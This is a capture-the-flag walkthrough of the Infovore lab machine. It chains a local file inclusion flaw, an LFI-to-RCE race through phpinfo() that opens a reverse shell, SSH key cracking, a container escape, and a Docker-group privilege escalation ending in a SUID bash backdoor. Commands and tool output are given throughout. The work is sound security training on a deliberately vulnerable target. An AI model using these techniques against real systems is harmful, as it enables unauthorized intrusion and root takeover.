Skills:

- Web Enumeration
- LFI (Local File Inclusion)
- Abusing file_uploads visible in info.php (LFI2RCE via phpinfo() + Race Condition)
- System Enumeration (Linpeas)
- Cracking Protected Private SSH Key
- Abusing ssh key pair trust to escape the container
- Abusing docker group [Privilege Escalation]

Only port 80 is open
``` 
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Include me ...

```

Nmap showed me --> http-title: Include me ... This made me think of a local file inclusion vulnerability, so I'm looking for that immediately

I fuzz the site looking for a file that would give me the path to exploit the LFI vulnerability
```
❯ gobuster dir -u http://192.168.0.107/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.107/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 4743]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.107/img/]
/info.php             (Status: 200) [Size: 69776]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.107/css/]
/vendor               (Status: 301) [Size: 315] [--> http://192.168.0.107/vendor/]

``` 

Gobuster found info.php file, which contains the information about the PHP configuration on the web server.
I then  fuzzed the site to identify the correct parameter for achieving local file inclusion

```
❯ wfuzz --hc=404 --hl=136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://192.168.0.107/index.php/?FUZZ=/etc/passwd'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.0.107/index.php/?FUZZ=/etc/passwd
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000025356:   200        26 L     33 W       1006 Ch     "filename"     

```

I found the vulnerable parameter, "filename", but I could only view the /etc/passwd, so I checked the php info, the site has the file_uploads enable, I could abuse this.
I checked on the hacktricks web how to exploit this https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo
Here is a python script --> https://github.com/mikaelkall/HackingAllTheThings/blob/master/lfi/phpinfolfi.py
```
❯ python2.7 phpinfolfi.py 192.168.0.107 80
Don't forget to modify the LFI URL
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 111437
Spawning worker pool (10)...
  24 /  1000
Got it! Shell created in /tmp/g

Woot!  \m/
Shuttin' down...

------------------------
❯ nc -nlvp 1234
Connection from 192.168.0.107:59197
www-data@e71b67461f6c:/var/www/html$ whoami
whoami
www-data
```

In this way I gain access to the system, However, I realized I was in a container. To escalate my privileges, I used Linpeas to enumerate the system and found an .oldkeys.tgz file containing two encrypted SSH private keys.

```
#checking host port
www-data@e71b67461f6c:/tmp$ echo '' > /dev/tcp/192.168.150.1/22

#the host has port 22 open (ssh) so I can gain access through ssh service
#crack the protected id_rsa on my machine
❯ ssh2john id_rsa > hash
❯ john --wordlist=~/Documents/wordlist/rockyou.txt hash
choclate93       (id_rsa)
```

The password for "id_rsa" is the same as the root user's in the container, and there's an ".ssh" folder in the root directory containing "id_rsa." This means I can break out of the container using this key with the password I mentioned earlier.
```
root@e71b67461f6c:~/.ssh# ssh -i id_rsa admin@192.168.150.1
Enter passphrase for key 'id_rsa': choclate93 
```

As the admin now, this user is in the docker group, so I can list the docker images.
```
admin@infovore:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                NAMES
e71b67461f6c        theart42/infovore   "docker-php-entrypoi…"   3 years ago         Up 3 hours          0.0.0.0:80->80/tcp   infovore
admin@infovore:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
theart42/infovore   latest              40de379c5116        3 years ago         428MB
```

I can totally exploit this because the admin user has Docker privileges.
```
admin@infovore:~$ docker run -dit -v /:/mnt/root theart42/infovore
1f479322b6c7d68fa9fff448e91316d6e602778cbe28956530d3ab74346d34ce
admin@infovore:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                NAMES
1f479322b6c7        theart42/infovore   "docker-php-entrypoi…"   3 seconds ago       Up 2 seconds        80/tcp               nostalgic_sammet
e71b67461f6c        theart42/infovore   "docker-php-entrypoi…"   3 years ago         Up 3 hours          0.0.0.0:80->80/tcp   infovore

admin@infovore:~$ docker exec -it nostalgic_sammet bash
root@1f479322b6c7:/var/www/html# whoami
root
root@1f479322b6c7:/var/www/html# 

root@1f479322b6c7:/var/www/html# cd /mnt
root@1f479322b6c7:/mnt# ls
root
root@1f479322b6c7:/mnt# cd root
root@1f479322b6c7:/mnt/root# ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
boot  etc  initrd.img  lib64  media	 opt  root  sbin  sys	usr  vmlinuz
root@1f479322b6c7:/mnt/root# cd root
root@1f479322b6c7:/mnt/root/root# ls
root.txt
root@1f479322b6c7:/mnt/root/root# cat root.txt 
 _____                             _       _                                              
/  __ \                           | |     | |                                             
| /  \/ ___  _ __   __ _ _ __ __ _| |_ ___| |                                             
| |    / _ \| '_ \ / _` | '__/ _` | __/ __| |                                             
| \__/\ (_) | | | | (_| | | | (_| | |_\__ \_|                                             
 \____/\___/|_| |_|\__, |_|  \__,_|\__|___(_)                                             
                    __/ |                                                                 
                   |___/                                                                  
__   __                                         _   _        __                         _ 
\ \ / /                                        | | (_)      / _|                       | |
 \ V /___  _   _   _ ____      ___ __   ___  __| |  _ _ __ | |_ _____   _____  _ __ ___| |
  \ // _ \| | | | | '_ \ \ /\ / / '_ \ / _ \/ _` | | | '_ \|  _/ _ \ \ / / _ \| '__/ _ \ |
  | | (_) | |_| | | |_) \ V  V /| | | |  __/ (_| | | | | | | || (_) \ V / (_) | | |  __/_|
  \_/\___/ \__,_| | .__/ \_/\_/ |_| |_|\___|\__,_| |_|_| |_|_| \___/ \_/ \___/|_|  \___(_)
                  | |                                                                     
                  |_|                                                                     
 
FLAG{And_now_You_are_done}

@theart42 and @4nqr34z
 
root@1f479322b6c7:~# cd /mnt/root
root@1f479322b6c7:/mnt/root# cd bin
root@1f479322b6c7:/mnt/root/bin# chmod u+s bash
root@1f479322b6c7:/mnt/root/bin# exit
exit
admin@infovore:~$ bash -p
bash-4.3# whoami
root
bash-4.3# 
```

Finish!